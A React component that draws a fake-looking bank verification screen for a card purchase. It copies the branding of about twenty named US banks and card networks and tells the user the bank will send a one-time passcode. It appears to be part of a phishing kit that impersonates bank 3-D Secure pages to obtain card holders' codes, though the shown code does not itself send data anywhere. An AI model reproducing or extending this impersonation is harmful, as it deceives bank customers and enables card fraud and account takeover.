import { CreditCard, Shield, Tally1 } from 'lucide-react';

interface VerificationStepsProps {
  selectedBank: string;
  banks: any[];
  cardData: any;
  cardType: string;
  handle2FASubmit: (e: React.FormEvent) => void;
}

const VerificationStep = ({
  selectedBank,
  banks,
  cardData,
  cardType,
  handle2FASubmit,
}: VerificationStepsProps) => {
  const bankData = banks.find((bnk) => bnk.name === selectedBank);
  const getCardIcon = (type: string) => {
    const iconClass = 'w-28 h-16 object-contain';
    switch (type) {
      case 'visa':
        return (
          <div
            className={`${iconClass} text-white text-xs justify-center font-bold flex items-center rounded`}
          >
            <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" />
          </div>
        );
      case 'mastercard':
        return (
          <div
            className={`${iconClass} text-white text-xs justify-center font-bold flex items-center rounded`}
          >
            <img src="/bank-logos/mc-logo.svg" alt="" />
          </div>
        );
      case 'amex':
        return (
          <div
            className={`${iconClass} text-white text-xs justify-center font-bold flex items-center rounded`}
          >
            <img
              src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-bluebox-solid.svg"
              alt=""
            />
          </div>
        );
      case 'discover':
        return (
          <div
            className={`${iconClass} bg-orange-500 text-white text-xs justify-center font-bold flex items-center rounded`}
          >
            DISC
          </div>
        );
      case 'jcb':
        return (
          <div
            className={`${iconClass} text-white justify-center text-xs font-bold flex items-center rounded`}
          >
            <img src="/bank-logos/jcb_emblem.svg" alt="" />
          </div>
        );
      case 'diners':
        return (
          <div
            className={`${iconClass} bg-gray-600 text-white text-xs justify-center font-bold flex items-center rounded`}
          >
            DC
          </div>
        );
      default:
        return <CreditCard className="w-6 h-6 text-gray-400" />;
    }
  };
  const fetchTwoStepVerification = () => {
    if (selectedBank === 'Wells Fargo') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#D61F28] h-16 rounded-t-lg border-b-4 border-[#FFCD41] flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[220px] h-[30px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Bank of America') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[300px] h-[30px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Chase') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[40px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Citi') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[100px] h-[90px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'US Bank') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[150px] h-[40px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Capital One') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex items-center">
            <img src={bankData?.additionalLogo} className="w-[80px] h-[40px]" />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Truist') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[60px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Truist') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[60px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Regions Bank') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[50px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'HSBC') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[50px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'KeyBank') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[150px] h-[60px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Discover Bank') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#ffffff] h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[50px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Fifth Third Bank') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[50px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'BMO Harris') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[50px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Huntington Bank') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[50px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Synchrony Bank') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[40px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Citizens Bank') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#ffffff] w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[50px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'M&T Bank') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#015840] h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[200px] h-[50px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'TD Bank') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[150px] h-[60px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'PNC') {
      return (
        <div className="flex justify-between mt-10 mx-10">
          <div className="bg-[#414E58] h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[300px] h-[40px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Ally Bank') {
      return (
        <div className="flex justify-between mt-10 mr-10">
          <div className="w-full h-16 rounded-t-lg flex items-center">
            <img
              src={bankData?.additionalLogo}
              className="w-[300px] h-[40px]"
            />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    } else if (selectedBank === 'Navy Federal Credit Union') {
      return (
        <div className="flex justify-between mt-10 mr-10">
          <div className="w-full h-16 rounded-t-lg flex items-center">
            <img src={bankData?.additionalLogo} className="w-[200px]" />
          </div>
          {getCardIcon(cardType)}
        </div>
      );
    }
  };
  return (
    <div>
      {fetchTwoStepVerification()}
      <div className="p-6">
        <div className="mb-6">
          <div className="flex items-center justify-center mx-auto mb-4">
            <Shield className="w-8 h-8 text-white" />
          </div>
          <h3 className="text-sm text-black mb-4">
            For added security {selectedBank} will send you a one-time passcode
            to verify this purchase.
          </h3>
          <p className="text-black mb-4 text-sm">
            By selecting Continue, you agree {selectedBank} may deliver the code
            to your registered device. We may send the code using an autodialer.
          </p>
          <p>*Carrier message and data rates may apply.</p>
          <form onSubmit={handle2FASubmit}>
            <div className="flex justify-center">
              <button
                type="submit"
                className={`bg-[#404145] font-medium py-2 px-2 my-3 text-sm transition-all duration-300 mt-8 text-white`}
              >
                Continue
              </button>
            </div>
          </form>

          <div className="flex">
            <span className="font-bold text-sm underline text-black">FAQ</span>{' '}
            <Tally1 className="mx-1" />
            <span className="font-bold text-sm underline text-black">
              Need Some Help?
            </span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default VerificationStep;
